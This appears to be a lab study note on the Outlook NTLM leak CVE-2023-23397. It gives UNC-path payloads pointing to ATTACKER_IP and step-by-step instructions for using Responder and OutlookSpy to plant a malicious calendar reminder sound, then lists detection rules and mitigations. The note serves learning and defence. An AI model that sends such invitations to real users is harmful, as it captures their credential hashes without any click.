## Outlook NTLM Leak CVE-2023-23397

### Tools: Responder, Outlook Appointment Alerts, OutlookSpy Plugin

### Affects all version of the Outlook desktop app on any Windows System.

### Exploit method: Zero-click

### Explanation:

#### 1) When sending calendar invitations, it is possible to add reminder notifications.

#### Go to the "reminder sound: at reminder tab.

#### 2) You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event.

## Abusing reminder sounds via UNC paths (Universal Naming Convention)

### Payload example:

#### 1) \\ATTACKER_IP\foo\bar.wav

#### 2) \\ATTACKER_IP@80\foo\bar.wav

#### 3) \\ATTACKER_IP@443\foo\bar.wav

### 2 and 3 examples are alternatives to SMB protocol that use HTTP and HTTPS to retrieve the file from a WebDAV enabled webserver.

### Exploitation:

#### 1) sudo responder -I INTERFACE

#### 2) On our outlook client, click the calendar, then new appointment to create one.

#### 3) Set the reminder to 0 minutes so that it triggers right after the victim receives it.

#### 4) Click on the sound option to configure the reminder's sound file

#### 5) Set the sound file path to a UNC that points to us \\OUR_IP\nonexistent\whatever.wav then click OK

#### 6) Install OutlookSpy* (Since the previous steps usually won't work as we want) *Close Outlook before installing the plugin

#### 7) Open Outlook, then go to OutlookSpy and then the CurrentItem button (within the appointment)to view our appointment 

#### 8) Set the ReminderSoundFile parameter to the UNC path that points to us, then set both ReminderOverrideDefault and ReminderPlaySound to true using the script tab.

#### 9) Click run to apply the changes.

#### 10) Go back to properties tab to verify the values were correctly changed.

#### 11) Save our appointment to add it to our calendar, then adjust the time, date and reminder trigger accordingly.

## Detection:

#### 1) Sigma rules: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml

#### 2) YARA rules

#### 3) Powershell script: https://microsoft.github.io/CSS-Exchange/Security/CVE-2023-23397/

## Mitigation:

#### 1) Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism

#### 2) Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.

#### 3) Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.

#### 4) Disable WebClient service to avoid webdav connection.
